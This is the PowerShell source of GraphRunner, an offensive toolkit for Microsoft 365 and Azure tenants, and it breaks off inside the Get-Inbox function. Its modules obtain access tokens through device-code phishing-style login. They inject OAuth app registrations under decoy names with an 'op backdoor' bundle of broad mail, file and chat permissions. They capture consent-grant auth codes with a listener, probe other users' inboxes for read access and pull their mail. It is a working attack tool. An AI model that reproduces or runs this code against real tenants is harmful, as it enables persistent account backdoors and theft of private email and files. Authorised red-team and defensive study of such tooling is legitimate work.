Write-Host -ForegroundColor green "
  ________                     __      _______      by Beau Bullock (@dafthack)                                
 /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________ 
/___\  __\______\____\ \_____\|__|__\|________/__|__\/____\ /____\_/____\______\
\    \_\  \  | \// __ \|  |_/ |   Y  \    |   \  |  /   |  \   |  \  ___/|  | \/
 \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|   
                 Do service principals dream of electric sheep?
                       
For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki
To list GraphRunner modules run List-GraphRunnerModules
"


function Get-GraphTokens{
    <#
        .SYNOPSIS
        Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Get-GraphTokens is the main user authentication module for GraphRunner. Upon authenticating it will store your tokens in the global $tokens variable as well as the tenant ID in $tenantid. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)     
    
    .EXAMPLE
        
        C:\PS> Get-GraphTokens
        Description
        -----------
        This command will initiate a device code auth where you can authenticate the terminal from an already authenticated browser session.
     #>

    param(
        [switch]$ExternalCall
    )

    If($tokens){
        $newtokens = $null
        while($newtokens -notlike "Yes"){
            Write-Host -ForegroundColor cyan "[*] It looks like you already tokens set in your `$tokens variable. Are you sure you want to authenticate again?"
            $answer = Read-Host 
            $answer = $answer.ToLower()
            if ($answer -eq "yes" -or $answer -eq "y") {
                Write-Host -ForegroundColor yellow "[*] Initiating device code login..."
                $global:tokens = ""
                $newtokens = "Yes"
            } elseif ($answer -eq "no" -or $answer -eq "n") {
                Write-Host -ForegroundColor Yellow "[*] Quitting..."
                return
            } else {
                Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
            }
        }
    }

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while ($continue) {
        $body = @{
            "client_id"   = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type"  = "urn:ietf:params:oauth:grant-type:device_code"
            "code"        = $authResponse.device_code
            "scope"       = "openid"
        }

        try {
            $tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body

            if ($tokens) {
                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                $tokobj = $tokenArray | ConvertFrom-Json
                $global:tenantid = $tokobj.tid
                Write-Output "Decoded JWT payload:"
                $tokobj
                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
                $continue = $null
            }
        } catch {
            $details = $_.ErrorDetails.Message | ConvertFrom-Json
            $continue = $details.error -eq "authorization_pending"
            Write-Output $details.error
        }

        if ($continue) {
            Start-Sleep -Seconds 3
        }
        else{
            $global:tokens = $tokens
            if($ExternalCall){
                return $tokens
            }
        }
    }
}

function Invoke-RefreshGraphTokens{
    <#
        .SYNOPSIS
        Access tokens typically have an expiration time of one hour so it will be necessary to refresh them occasionally. If you have already run the Get-GraphTokens command your refresh tokens will be utilized when you run Invoke-RefreshGraphTokens to obtain a new set of tokens.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Access tokens typically have an expiration time of one hour so it will be necessary to refresh them occasionally. If you have already run the Get-GraphTokens command your refresh tokens will be utilized when you run Invoke-RefreshGraphTokens to obtain a new set of tokens.    
    
    .EXAMPLE
        
        C:\PS> Invoke-RefreshGraphTokens
        Description
        -----------
        This command will use the refresh token in the $tokens variable to execute a token refresh.
    

    #>

    if(!$tokens){
        write-host -ForegroundColor red '[*] No tokens found in the $tokens variable. Use the Get-GraphTokens module to authenticate first.'
    break
    }
    Write-Host -ForegroundColor yellow "[*] Refreshing Tokens..."
    $authUrl = "https://login.microsoftonline.com/$tenantid"
    $refreshbody = @{
            "resource" = "https://graph.microsoft.com/"
            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" =    "refresh_token"
            "refresh_token" = $tokens.refresh_token
            "scope"=         "openid"
        }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    } 
    if($reftokens)
            {
                $global:tokens = $reftokens
                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                $tokobj = $tokenArray | ConvertFrom-Json
                $global:tenantid = $tokobj.tid
                Write-host "Decoded JWT payload:"
                $tokobj
                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
                break
            }
}

function Invoke-InjectOAuthApp{


<#
    .SYNOPSIS
        This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
    
    .PARAMETER AppName
        
        The display name of the App Registration. This is what will be displayed on the consent page.
    
    .PARAMETER ReplyUrl
        
        The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
    
    .PARAMETER Scope
        
        Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
    
     .PARAMETER Tokens
        
        Provide an already authenticated access token. 

    .EXAMPLE
        
        C:\PS> Invoke-InjectOAuthApp -AppName "Win Defend for M365" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
        Description
        -----------
        This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
    
    .EXAMPLE
        
        C:\PS> Invoke-InjectOAuthApp -AppName "Not a Backdoor" -ReplyUrl "http://localhost:10000" -scope "op backdoor" -AccessToken "eyJ0eXAiOiJKV..."
        Description
        -----------
        This command takes an already authenticated access token gathered from something like a device code login. It uses the hardcoded value of "op backdoor" as the scope to add a large number of permissions to the app registration. None of these permissions require admin consent. Also, by specifying the reply url as running on localhost you can use the Invoke-AutoOAuthFlow module to spin up a web server on the localhost for capturing the auth code during consent flow.
#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $AppName = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $ReplyUrl = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string[]]
    $Scope,
    
    [Parameter(Position = 3, Mandatory = $False)]
    [object[]]
    $Tokens
  )
    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to deploy the app as." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $access_token = $tokens.access_token        
    $Headers = @{
        Authorization = "Bearer $access_token"
    }

    # Get Microsoft Graph Object ID
    Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"


    # Get full service principal list

    $initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
    $headers = @{"Authorization" = "Bearer $access_token"}

    # Initialize an array to store all collected data
    $allData = @()

    # Loop until there's no more nextLink
    do {
        # Invoke the web request
        try{
            $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers
        }catch{
            Write-Host -ForegroundColor Red "[*] Something went wrong."
            return
        }
        # Convert the response content to JSON
        $jsonData = $response.Content | ConvertFrom-Json

        # Add the current page's data to the array
        $allData += $jsonData.value

        # Check if there's a nextLink
        if ($jsonData.'@odata.nextLink') {
            $initialUrl = $jsonData.'@odata.nextLink'
        } 
        else { 
            break
        }
    } while ($true)

    $appDisplayNameToSearch = "Microsoft Graph"
    $graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
    $graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
    Write-Output "Graph ID: $graphId"
    Write-Output "Internal Graph ID: $graphIdInternal"

    # Get Object IDs of individual permissions
    Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
    $spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
    $spnsjson = $spns.Content | ConvertFrom-Json

    if ($Scope -like "op backdoor")
    {
        $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
        Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
    }
    elseif ($Scope -like "mail reader")
    {
        $Scope = "openid","profile","offline_access","email","User.Read","Mail.Read","Mail.Read.Shared"
        Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
    }
    $scopeurl = ""
    $accesslist = ""
    $scopeIds = @{}
    $joinedScope = $Scope -join " "
    $joinedScope

    # Loop through each item in $Scope
    foreach ($item in $Scope){
        $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
        $variableName = $variableName + "Scope"
    

        $scopeItem = $spnsjson.oauth2PermissionScopes | Where-Object { $_.value -eq "$item" } |select-object id
        $scopeId = ('"' + $scopeItem.Id +'"')
        if (!$scopeId){Write-host -foregroundcolor red "[**] Couldn't find scope option $item"}
        else{
        Write-Host ($item + " : " + $scopeId)
        $scopeurl += "$item%20"
        $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
    
        # Store the scope ID in the hashtable
        $scopeIds[$variableName] = $scopeId
        }
    }

    Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
    # Create a resources variable
    $permissions = $accesslist.Trim(",")

$resources = @"
{"resourceAppId": "$graphId", "resourceAccess": [$permissions]}
"@

    # Create the app in the tenant
    Write-host -ForegroundColor yellow "[*] Now deploying the app registration with display name $AppName to the tenant."

    $resourceAccess = $resources | ConvertFrom-Json

    # Construct the JSON body
    $jsonBody = @{
        displayName         = $AppName
        signInAudience      = "AzureADMultipleOrgs"
        keyCredentials      = @()
        web                 = @{
            redirectUris = @($ReplyUrl)
        }
        requiredResourceAccess = @(
            @{
                resourceAppId   = $resourceAccess.resourceAppId
                resourceAccess = $resourceAccess.resourceAccess
            }
        )
    }

    # Convert the JSON body to a properly formatted JSON string
    $finalJson = $jsonBody | ConvertTo-Json -Depth 10

    $appcreationheaders = @{
        Authorization = "Bearer $access_token"
        "Content-Type" = "application/json"
        "Accept-Encoding" = "gzip, deflate"
    }


    $appresponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications" -Headers $appcreationheaders  -Method Post -Body $finaljson

    if (!$appresponse){
        Write-host -ForegroundColor red "[*] An error occurred during deployment."
        break
    }

    $currentTime = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
    $oneYearLater = (Get-Date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ssZ")
    $secretCredential = @{
        passwordCredential = @{
            displayName = $null
            endDateTime = $oneYearLater
            startDateTime = $currentTime
        }
    }
    $SecretBody = $secretCredential | ConvertTo-Json
    $applicationid = $appresponse.id
    $secretrequest = Invoke-WebRequest -Headers $Headers -Method POST -ContentType "application/json" -Body $SecretBody -Uri "https://graph.microsoft.com/v1.0/applications/$applicationid/addPassword"

    $secretdata = $secretrequest.Content |ConvertFrom-json

    # Generate the Consent URL
    Write-host -ForegroundColor yellow "[*] If everything worked successfully this is the consent URL you can use to grant consent to the app:"
    $consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=" + $appresponse.AppId + "&response_type=code&redirect_uri=
    " + [System.Web.HttpUtility]::UrlEncode($ReplyUrl) + "&response_mode=query&scope=" + $scopeurl.Trim("%20") + "&state=1234"
    Write-Host "--------------------------------------------------------"
    Write-Host -ForegroundColor green $consentURL
    Write-Host "--------------------------------------------------------"
    Write-Host ("Application ID: " + $appresponse.AppId)
    Write-Host ("Object ID: " + $appresponse.Id)
    Write-Host ("Secret: " + $Secretdata.secretText)
    Write-Host "--------------------------------------------------------"

    if($ReplyUrl -match "localhost" -or $ReplyUrl -match "127.0.0.1"){
    Write-Host "Localhost detected in Reply URL field. You can use the Invoke-AutoOAuthFlow module to complete the OAuth flow automatically."
    Write-Host "--------------------------------------------------------"
    $scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
    Write-Host -ForegroundColor Cyan ('Invoke-AutoOAuthFlow -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean)
    }
    else{
    Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
    Write-Host "--------------------------------------------------------"
    $scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
    Write-Host -ForegroundColor Cyan ('Get-AzureAppTokens -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
    }
}


function Invoke-DeleteOAuthApp{
    <#
     .SYNOPSIS
        Simple module to delete an app registration. Use the Object ID (Output at the end of Invoke-InjectOAuthApp) not the app ID.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Simple module to delete an app registration. Use the Object ID (Output at the end of Invoke-InjectOAuthApp) not the app ID.

    .PARAMETER Tokens

        Provide an already authenticated access token. 

    .PARAMETER ObjectID

        The Object ID of the app registration you want to delete.
    
    .EXAMPLE
        
        C:\PS> Invoke-DeleteOAuthApp -Tokens $tokens -ObjectID <object ID of app>
        Description
        -----------
        This command will delete the specified app registration from the tenant.

    #>

    param(
        [Parameter(Position = 0, Mandatory = $True)]
        [object[]]
        $Tokens = "",
        [Parameter(Position = 0, Mandatory = $True)]
        [string]
        $ObjectID = ""
    )
    $accessToken = $tokens.access_token
    $deleteUrl = "https://graph.microsoft.com/v1.0/applications/$ObjectID"
    $headers = @{
        Authorization = "Bearer $accessToken"
    }


    $response = Invoke-RestMethod -Uri $deleteUrl -Headers $headers -Method Delete

    if ($response -ne $null) {
        Write-Output "App registration with ID $ObjectId deleted successfully."
    } else {
        Write-Error "Error deleting app registration."
    }

}

Function Invoke-GraphOpenInboxFinder{
    <#
    .SYNOPSIS

        A module that can be used to find inboxes of other users in a tenant that are readable by the current user. This oftentimes happens when a user has misconfigured their mailbox to allow others to read mail items within it. NOTE: You must have Mail.Read.Shared or Mail.ReadWrite.Shared permissions to read other mailboxes with the Graph.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       A module that can be used to find inboxes of other users in a tenant that are readable by the current user. This oftentimes happens when a user has misconfigured their mailbox to allow others to read mail items within it. NOTE: You must have Mail.Read.Shared or Mail.ReadWrite.Shared permissions to read other mailboxes with the Graph.

    .PARAMETER Tokens

        Provide an already authenticated access token. 

    .PARAMETER UserList

        Userlist of users to check (one per line)
    
    .EXAMPLE
        
        C:\PS> Invoke-GraphOpenInboxFinder -Tokens $tokens -UserList userlist.txt
        Description
        -----------
        Using this module will attempt to access each inbox in the userlist file as the current user. 

    #>

    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userlist = ""
    )

    if($tokens){
        $access_token = $tokens.access_token
    }
    else{
        Write-Host -ForegroundColor yellow "[*] No tokens detected. Pass your authenticated tokens to this module with the -Tokens option. "
        return
    }
    
    $Mailboxes = @(Get-Content -Path $userlist)
    
    if (!$Mailboxes){return}

    $count = $Mailboxes.count
    $curr_mbx = 0
    Write-Host -ForegroundColor yellow "[*] Note: To read other user's mailboxes your token needs to be scoped to the Mail.Read.Shared or Mail.ReadWrite.Shared permissions."   

    Write-Output "`n`r"
    Write-Output "[*] Checking access to mailboxes for each email address..."
    Write-Output "`n`r"
    foreach($mbx in $Mailboxes)
    {
        $request = ""
        Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r"
        $curr_mbx += 1
        try { $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
        }catch{
            $err = $_.Exception.Response.StatusCode.Value__
        }
    
        If ($request.StatusCode -eq 200){
            Write-Host -ForegroundColor Green "[*] SUCCESS! Inbox of $mbx is readable."
            $out = $request.Content | ConvertFrom-Json
            Write-Host ("Latest Email Received " + $out.value.createdDateTime + " with subject: " + $out.value.subject)
        }
    }
}



Function Get-AzureAppTokens{
    <#
        .SYNOPSIS

        This module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.

    .PARAMETER ClientId

        The Client ID (AppID) of the App

    .PARAMETER ClientSecret

        The secret of the app
    
    .PARAMETER RedirectUri

        The Redirect URI used in the authorization request
    
    .PARAMETER Scope

        Permission scope of the app "Mail.Read openid etc"
    
    .PARAMETER AuthCode

        The authorization code retrieved from the request sent to the redirect URI during the OAuth flow

    .EXAMPLE
        
        C:\PS> Get-AzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -AuthCode "0.AUYAME_74EXAMPLEUZSUBZqrWXZOtU7Jh4..."
        -----------
        This will authenticate as an app registration (service principal) while completing an OAuth flow using the AuthCode provided. This would be useful in a situation where you have harvested an OAuth code during a consent grant flow.
    
    #>

    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $Scope = "",

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $ClientID = "",

        [Parameter(Position = 2, Mandatory = $true)]
        [string]
        $ClientSecret = "",

        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $RedirectUri = "",

        [Parameter(Position = 4, Mandatory = $true)]
        [string]
        $AuthCode = ""
    )

    $body = @{client_id=$ClientID
    scope=$Scope
    code=$AuthCode
    redirect_uri=$RedirectUri
    grant_type="authorization_code"
    client_secret=$ClientSecret
    }

    try{
    $request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    $continue = $details.error -eq "authorization_pending"
    Write-Output $details.error
    }
    if($request)
        {
            try{
                $global:apptokens = $request.Content | ConvertFrom-Json
            }
            catch{
                $details=$_.ErrorDetails.Message | ConvertFrom-Json
                Write-Output $details.error
                return
            }
            Write-Output "---Here is your access token---"
            $apptokens.access_token
            Write-Output "---Here is your refresh token---"
            $apptokens.refresh_token
            Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $apptokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $apptokens)'
            Write-Host -ForegroundColor Green '[*] You can use this command to refresh your tokens:'
            Write-Host -ForegroundColor Cyan ('Invoke-RefreshAzureAppTokens -ClientId "' + $ClientId + '" -ClientSecret "' + $ClientSecret + '" -RedirectUri "' + $RedirectUri + '" -scope "' + $Scope + '" -RefreshToken "' + $apptokens.refresh_token + '"' )
        }
}

Function Invoke-CheckAccess{
    <#
        .SYNOPSIS 
            
            A simple module for checking Graph access.

    #>

    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = ""
    )
    $access_token = $tokens.access_token
    $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
    $out = $request.Content | ConvertFrom-Json
    $out
}

Function Invoke-RefreshAzureAppTokens{
    <#
     .SYNOPSIS

        This module refreshes an Azure App token.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module refreshes an Azure App token.

    .PARAMETER ClientId

        The Client ID (AppID) of the App

    .PARAMETER ClientSecret

        The secret of the app
    
    .PARAMETER RedirectUri

        The Redirect URI used in the authorization request
    
    .PARAMETER Scope

        Permission scope of the app "Mail.Read openid etc"
    
    .PARAMETER RefreshToken

        A refresh token associated with the app

    .EXAMPLE
        
        C:\PS> Invoke-RefreshAzureAppTokens -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "https://YOURREDIRECTWEBSERVER.azurewebsites.net" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read" -RefreshToken "0.AUYAME_75cEXAMPLEUBZqrWd22WdOz..."
        -----------
        This will refresh your Azure app tokens.

    #>

    
Param
(
    [Parameter(Position = 0, Mandatory = $false)]
    [string]
    $Scope = "openid offline_access email user.read profile",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $RefreshToken = ""
)

    $body = @{client_id=$ClientID
    scope=$Scope
    refresh_token=$RefreshToken
    redirect_uri=$RedirectUri
    grant_type="refresh_token"
    client_secret=$ClientSecret
    }

    $request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
    $global:apptokens = $request.Content | ConvertFrom-Json
    Write-Output "---Here is your access token---"
    $apptokens.access_token
    Write-Output "---Here is your refresh token---"
    $apptokens.refresh_token
    Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $apptokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $apptokens)'
}


Function Invoke-AutoOAuthFlow{
    <#
        .SYNOPSIS

        Whenever a user consents to an OAuth app their browser sends a request to a specified redirect URI to provide an authorization code. In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in this repo to capture the code. If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost. This modules stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Whenever a user consents to an OAuth app their browser sends a request to a specified redirect URI to provide an authorization code. In situations where the user is remote you would most likely want to stand up a web server and use something like the basic PHP redirector included in this repo to capture the code. If we are creating persistence within an account we control it's possible to complete this flow by directing the browser to localhost. This modules stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials.

    .PARAMETER ClientId

        The Client ID (AppID) of the App

    .PARAMETER ClientSecret

        The secret of the app
    
    .PARAMETER RedirectUri

        The Redirect URI used in the authorization request
    
    .PARAMETER Scope

        Permission scope of the app "Mail.Read openid etc"
    
    .EXAMPLE
        
        C:\PS> Invoke-AutoOAuthFlow -ClientId "13483541-1337-4a13-1234-0123456789ABC" -ClientSecret "v-Q8Q~fEXAMPLEEXAMPLEDsmKpQw_Wwd57-albMZ" -RedirectUri "http://localhost:10000" -scope "openid profile offline_access email User.Read User.ReadBasic.All Mail.Read"
        -----------
        This will spin up a webserver on your localhost port 10000 to catch the auth code during consent grant.

    #>
    Param
    (
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Scope = "",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = ""
    )
    
    Add-Type -AssemblyName System.Web

    $uri = [System.Uri]$RedirectUri

    if ($uri.Port -eq -1) {
        # Port is not specified in the RedirectUri
        $port = if ($uri.Scheme -eq "https") { 443 } else { 80 }
    } else {
        $port = $uri.Port
    }

    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$port/")
    $listener.Start()

    Write-Host "Listening for incoming requests on http://localhost:$port/"

    $oauthcodes  = @()
    while ($true) {
        $context = $listener.GetContext() # This blocks until a request is received
        $request = $context.Request
        $response = $context.Response

        # Capture the OAuth code from the query parameters
        $queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
        $oauthCode = $queryParams["code"]
            
        Write-Host "Captured OAuth code: $oauthCode"

        # Respond to the client
        $responseText = "OAuth code captured successfully."
        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
        $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
        $response.Close()
            
        if($oauthCode -notin $oauthcodes){
        Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode
        }
        else{
            Write-Host "[*] Skipping OAuth code we've already seen..."
        }
        $oauthcodes += $oauthCode

    }

}

Function Get-Inbox{
    <#
    .SYNOPSIS

        This module will pull the latest emails from the inbox of a particular user. NOTE: This is the module you want to use if you are reading mail from a shared mailbox.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module will pull the latest emails from the inbox of a particular user. NOTE: This is the module you want to use if you are reading mail from a shared mailbox.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER userId

        Email address of the mailbox you want to read
    
    .PARAMETER TotalMessages

        Default is 25, Max is 1000
    
    .PARAMETER OutFile

        File to output the results to
    
    .EXAMPLE
        
        C:\PS> Get-Inbox -Tokens $tokens -userid deckard@tyrellcorporation.io -TotalMessages 50 -OutFile emails.csv
        -----------
        This will connect to the specified userid's inbox and pull the latest 50 messages. 

    #>
    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $userid = "",
    [Parameter(Position = 2, Mandatory = $false)]
    [string]
    $TotalMessages = "25",
    [Parameter(Position = 3, Mandatory = $false)]
    [string]
    $OutFile = ""
    )
    if($Tokens){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."   
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
